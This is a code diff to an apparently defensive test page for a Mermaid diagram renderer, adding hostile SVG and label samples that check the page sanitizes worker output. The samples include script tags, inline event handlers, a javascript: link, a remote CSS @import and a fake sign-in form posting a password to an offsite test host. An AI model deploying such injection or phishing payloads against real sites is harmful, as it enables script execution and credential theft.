@@ -15,8 +15,9 @@ import '@/styles/tailwind.css';
 const REMOTE = 'https://mermaid-remote.test';
 
 /** `?worker=hostile`: the worker answers this SVG for every diagram, to show
- * the page sanitizes what the worker draws before inserting it. */
-const HOSTILE_SVG = `<svg id="mmd-hostile" onload="window.pwned=1" viewBox="0 0 100 40"><script>window.pwned=1</script><image href="${REMOTE}/hostile-image.png"/><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><img src="${REMOTE}/hostile-label.png" onerror="window.pwned=1"/><span onmouseover="window.pwned=1">hostile</span></div></foreignObject><a href="javascript:window.pwned=1"><text>script link</text></a><a href="https://offsite.test/hostile"><text>outside link</text></a></svg>`;
+ * the page sanitizes what the worker draws before inserting it: a label's
+ * stylesheet (review H1) and a sign-in form (review L6) included. */
+const HOSTILE_SVG = `<svg id="mmd-hostile" onload="window.pwned=1" viewBox="0 0 100 40"><script>window.pwned=1</script><image href="${REMOTE}/hostile-image.png"/><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><style>@import '${REMOTE}/hostile-label.css'; body{outline:9px solid red}</style><img src="${REMOTE}/hostile-label.png" onerror="window.pwned=1"/><span onmouseover="window.pwned=1">hostile</span><form action="https://offsite.test/sign-in"><input name="password"/><textarea name="note"></textarea><select name="who"><option>me</option></select><button>Sign in again</button></form></div></foreignObject><a href="javascript:window.pwned=1"><text>script link</text></a><a href="https://offsite.test/hostile"><text>outside link</text></a></svg>`;
 const HOSTILE =
   new URLSearchParams(location.search).get('worker') === 'hostile';
 if (HOSTILE)
@@ -55,6 +56,9 @@ const REFERENCING: Record<string, string> = {
   fontFamilyDirective: `%%{init: {"fontFamily": "x; mask-image:url(${REMOTE}/font.png)"}}%%\nflowchart LR\n  A --> B`,
   imageNode: `flowchart LR\n  A@{ img: "${REMOTE}/node.png", label: "Cat" } --> B`,
   labelImage: `flowchart LR\n  A["<img src='${REMOTE}/label.png'> node"] --> B`,
+  // A label's stylesheet would style the whole page and import from outside
+  // (review H1).
+  labelStyleImport: `flowchart LR\n  A["<style>@import '${REMOTE}/label-import.css'; body{outline:9px solid red}</style>hi"] --> B`,
   // Links stay clickable; nothing loads until someone clicks.
   link: 'flowchart LR\n  A --> B\n  click A href "https://offsite.test/x"\n  click B href "javascript:void(0)"',
   linkStyleFunction: `flowchart LR\n  A --> B\n  linkStyle 0 stroke:#f00,mask-image:url(${REMOTE}/linkstyle.png)`,
